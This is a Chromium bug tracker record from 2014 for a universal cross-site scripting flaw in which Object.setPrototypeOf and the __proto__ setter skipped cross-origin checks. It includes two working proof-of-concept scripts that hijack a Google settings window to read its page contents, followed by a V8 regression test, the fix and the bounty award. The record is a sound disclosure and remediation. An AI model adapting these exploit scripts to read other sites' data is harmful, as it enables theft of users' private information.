# UXSS with Object.setPrototypeOf

| Field | Value |
|-------|-------|
| **Issue ID** | [40079161](https://issues.chromium.org/issues/40079161) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript>Runtime |
| **Reporter** | se...@gmail.com |
| **Assignee** | ve...@chromium.org |
| **Created** | 2014-03-19 |
| **Bounty** | $5,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.60 Safari/537.36

Steps to reproduce the problem:

What is the expected behavior?

What went wrong?
The current implementation of Object.setPrototypeOf doesn't have any security checks.
To exploit this as a UXSS an attacker could replace the victim's window prototype with an object
which has default methods/property accessors redefined to leak an object from the victim's JS context.

Repro:
<script>
url = "https://www.google.com/settings/personalinfo?";

function alertBody(value) {
	alert(value.constructor("return document.body.innerHTML")());
}

protoObj = { };
for (var i in window.__proto__)
	if (i.indexOf("on") == 0) //redefine event handlers
		protoObj.__defineSetter__(i, alertBody);

function clickHandler()
{
	wnd = open(url);

	setInterval(function() {
		Object.setPrototypeOf(wnd, protoObj);
	}, 0);

	setInterval(function() {
		wnd.location = url + Math.random();
	}, 2000);
}
</script>
<button onclick="clickHandler()">Click me</button>

Affected versions:
Google Chrome	34.0.1847.60 (Официальная сборка 256359) beta-m
Google Chrome	35.0.1898.0 (Официальная сборка 257789) canary

Chrome stable doesn't have setPrototypeOf yet.

Did this work before? N/A 

Chrome version: 34.0.1847.60  Channel: beta
OS Version: 6.1 (Windows 7, Windows Server 2008 R2)
Flash Version: Shockwave Flash 13.0 r0

## Timeline

### sc...@gmail.com (2014-03-19)

Nice find. Do you want anonymity on this one?

### rs...@chromium.org (2014-03-19)

abarth: Could you take a look at this or redirect to someone who can?

### ab...@chromium.org (2014-03-19)

This will likely need to be fixed inside V8.  Maybe adamk@ knows who on the V8 team is working on Object.setPrototypeOf

### ad...@chromium.org (2014-03-19)

Looks like it was added by arv in https://code.google.com/p/v8/source/detail?r=18685 (and relanded in https://code.google.com/p/v8/source/detail?r=18739).

### dx...@chromium.org (2014-03-20)

danno@, can you help? arv@ is on vacation.

### da...@chromium.org (2014-03-20)

Toon, sorry about the fire drill, but could you please take a look?

### [Deleted User] (2014-03-20)

The quick fix might be to unship Object.setPrototypeOf.

### da...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### ro...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### mv...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### ro...@chromium.org (2014-03-20)

+1 for unshipping Object.setPrototypeOf, if that's actually enough. But the same issue might apply to the __proto__ setter, which is more difficult to undo. CC'ed Michael, who implemented that.

### se...@gmail.com (2014-03-20)

@scarybeasts yeah, please treat my bugs as anonymous by default.

### se...@gmail.com (2014-03-20)

@rossberg actually you're right about __proto__, its setter implementation is the same as Object.setPrototypeOf. I just didn't notice __proto__ is now implemented using accessors.

Updated repro that works on stable:
<script>
url = "https://www.google.com/settings/personalinfo?";

if (!Object.setPrototypeOf) {
	var f = Object.prototype.__lookupSetter__("__proto__");
	Object.setPrototypeOf = f.call.bind(f);
}

function alertBody(value) {
	alert(value.constructor("return document.body.innerHTML")());
}

protoObj = { };
for (var i in window.__proto__)
	if (i.indexOf("on") == 0) //redefine event handlers
		protoObj.__defineSetter__(i, alertBody);

function clickHandler()
{
	wnd = open(url);

	setInterval(function() {
		Object.setPrototypeOf(wnd, protoObj);
	}, 0);

	setInterval(function() {
		wnd.location = url + Math.random();
	}, 2000);
}
</script>
<button onclick="clickHandler()">Click me</button>

### rs...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### ms...@chromium.org (2014-03-20)

I investigated the impact on __proto__ as well. It is affected since the removal of the __proto__ setter poison pill as demonstrated by https://crbug.com/chromium/354123#c13 as well. The __proto__ getter on the other hand has the necessary access check. Thanks for the great repro case! The following is the V8-side regression test.

THREADED_TEST(SecurityChecksForPrototype) {
  i::FLAG_allow_natives_syntax = true;
  LocalContext current;
  v8::Isolate* isolate = current->GetIsolate();
  v8::HandleScope scope(isolate);

  v8::Handle<v8::ObjectTemplate> templ = v8::ObjectTemplate::New(isolate);
  templ->SetAccessCheckCallbacks(NamedAccessCounter, IndexedAccessCounter);
  current->Global()->Set(v8_str("friend"), templ->NewInstance());

  // Test access using __proto__ from the prototype chain.
  named_access_count = 0;
  CompileRun("friend.__proto__ = {};");
  CHECK_EQ(1, named_access_count);

  // Test access using __proto__ as a hijacked function.
  named_access_count = 0;
  CompileRun("var p = Object.prototype;"
             "var f = Object.getOwnPropertyDescriptor(p, '__proto__').set;"
             "%DebugPrint(f);"
             "f.call(friend, {});");
  CHECK_EQ(1, named_access_count);

  // Test access using Object.setPrototypeOf reflective method.
  named_access_count = 0;
  CompileRun("Object.setPrototypeOf(friend, {});");
  CHECK_EQ(1, named_access_count);
}

### in...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-03-20)

[Empty comment from Monorail migration]

### ms...@chromium.org (2014-03-20)

Fix is in flight: https://codereview.chromium.org/205033011/

### dx...@chromium.org (2014-03-25)

when can we request a merge?

### ms...@chromium.org (2014-03-25)

Today's canary (i.e. 35.0.1908.2 and 35.0.1908.0) is the first canary to contain the fix. I can merge the fix to V8 branches later today if nothing jumps up.

This will need to be merged back to V8 version 3.24 (used in Chrome 34) and V8 version 3.23 (used in Chrome 33).

### dx...@chromium.org (2014-03-25)

[Empty comment from Monorail migration]

### ms...@chromium.org (2014-03-26)

The fix has been merged back to V8 branches as V8 version 3.24.35.20 and 3.23.17.29.

https://code.google.com/p/v8/source/detail?r=20269
https://code.google.com/p/v8/source/detail?r=20274

### dx...@google.com (2014-03-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-27)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-03-28)

[Empty comment from Monorail migration]

### mb...@chromium.org (2014-04-04)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-05)

[Comment Deleted]

### ti...@chromium.org (2014-04-05)

[Comment Deleted]

### ti...@chromium.org (2014-04-05)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-14)

Thanks for the report - $5000 for this one. I'll start the payment process today.

### ti...@chromium.org (2014-04-15)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-28)

Processing via our e-payment system can take a few weeks, but reward should be on its way to you.

### cl...@chromium.org (2014-07-02)

Bulk update: removing view restriction from closed bugs.

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### mm...@chromium.org (2016-10-05)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Runtime]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/354123?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript>Runtime]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079161)*
